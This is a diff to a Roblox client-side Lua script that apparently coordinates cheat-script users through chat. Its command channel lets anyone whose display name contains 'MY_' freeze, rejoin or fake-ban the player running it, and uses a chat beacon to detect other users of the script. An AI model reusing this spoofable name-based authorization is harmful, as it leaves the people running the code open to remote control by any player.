@@ -1,56 +1,95 @@
 local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TeleportService = game:GetService("TeleportService")
 local LocalPlayer = Players.LocalPlayer
 
-local placeId = game.PlaceId
-local jobId = game.JobId
+local function isAuthorized(player)
+	local name = player.DisplayName
+	return name:find("MY_") or name:find("My_")
+end
 
-local function freezePlayer()
-	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-	for _, part in pairs(character:GetDescendants()) do
+local function freezeSelf()
+	local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+	for _, part in ipairs(char:GetDescendants()) do
 		if part:IsA("BasePart") then
 			part.Anchored = true
 		end
 	end
 end
 
-local function unfreezePlayer()
-	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-	for _, part in pairs(character:GetDescendants()) do
+local function unfreezeSelf()
+	local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+	for _, part in ipairs(char:GetDescendants()) do
 		if part:IsA("BasePart") then
 			part.Anchored = false
 		end
 	end
 end
 
-local function rejoinServer()
-	TeleportService:TeleportToPlaceInstance(placeId, jobId, LocalPlayer)
+local function rejoinSelf()
+	TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
 end
 
-local function onPlayerChatted(player)
-	player.Chatted:Connect(function(message)
-		message = message:lower()
-		if player == LocalPlayer then return end 
+local function fakeBan()
+	LocalPlayer:Kick("Banned: Exploits")
+end
 
-		if message == "!freeze" then
-			freezePlayer()
-		elseif message == "!unfreeze" then
-			unfreezePlayer()
-		elseif message == "!stop" then
-			rejoinServer()
+local function sendPing()
+	local chatRemote = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):FindFirstChild("SayMessageRequest")
+	if chatRemote then
+		chatRemote:FireServer("wwwwwww", "All")
+	end
+end
+
+local function matchesName(target, name)
+	return target.Name:lower():sub(1, #name) == name:lower()
+end
+
+local function handleCommand(sender, message)
+	if not isAuthorized(sender) then return end
+
+	local args = message:split(" ")
+	local cmd = args[1]:lower()
+	local target = args[2]
+
+	local affectsMe = false
+	if not target and sender ~= LocalPlayer then
+		affectsMe = true
+	elseif target and matchesName(LocalPlayer, target) then
+		affectsMe = true
+	end
+
+	if cmd == "!freeze" and affectsMe then
+		freezeSelf()
+	elseif cmd == "!unfreeze" and affectsMe then
+		unfreezeSelf()
+	elseif cmd == "!stop" and affectsMe then
+		rejoinSelf()
+	elseif cmd == "!fake" and affectsMe then
+		fakeBan()
+	elseif cmd == "!detect" and sender ~= LocalPlayer then
+		sendPing()
+	end
+end
+
+local function onChatted(player)
+	player.Chatted:Connect(function(msg)
+		if msg == "wwwwwww" and player ~= LocalPlayer then
+			print("[DETECTED SCRIPT USER]:", player.Name)
+			return
 		end
+		handleCommand(player, msg)
 	end)
 end
 
 for _, player in ipairs(Players:GetPlayers()) do
 	if player ~= LocalPlayer then
-		onPlayerChatted(player)
+		onChatted(player)
 	end
 end
 
 Players.PlayerAdded:Connect(function(player)
 	if player ~= LocalPlayer then
-		onPlayerChatted(player)
+		onChatted(player)
 	end
 end)
-
